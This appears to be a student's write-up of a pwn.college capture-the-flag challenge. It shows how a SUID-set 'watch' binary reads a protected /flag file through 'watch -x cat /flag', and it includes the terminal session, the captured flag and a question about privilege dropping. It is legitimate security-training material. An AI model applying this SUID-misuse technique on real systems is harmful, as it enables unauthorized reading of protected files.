`watch`

`watch` executes a program periodically, showing output full screen. It's useful for monitoring changes or updates in real time.

try running `watch -d -n 1 top` on terminal. Also read the `man watch`.

```bash
hacker@program-misuse-level-31:~$ cd /challenge/
hacker@program-misuse-level-31:/challenge$ ls
babysuid_level31
hacker@program-misuse-level-31:/challenge$ ./babysuid_level31 
Welcome to ./babysuid_level31!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/watch.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/watch!
hacker@program-misuse-level-31:/challenge$ watch cat /flag
hacker@program-misuse-level-31:/challenge$ watch -x cat /flag
```


 `Every 2.0s: cat /flag                                                                                                                          program-misuse-level-31: Tue Jan  2 13:26:55 2024> 
 
`pwn.college{M5lwn2rcFJvBADPnttRAtgpLHae.01M3EDL0AjNzQzW}`

If you run `watch cat /flag` it will show `permission denied`. Other options also gave me `permission denied`. But `watch -x cat /flag` gave me the flag.

> [!In the manual, I found this]
> -x, --exec
>               Pass command to exec(2) instead of sh -c which reduces the need to use extra quoting to get the desired effect.


But don't know what does it mean?

> [!QUESTION]
> Also, When I run `watch cat /flag` with `watch` having the SUID bit set, it should inherit those elevated permissions and be able to read the `/flag` file even if I don't have permission to read it. But we see it says `permission denied`.
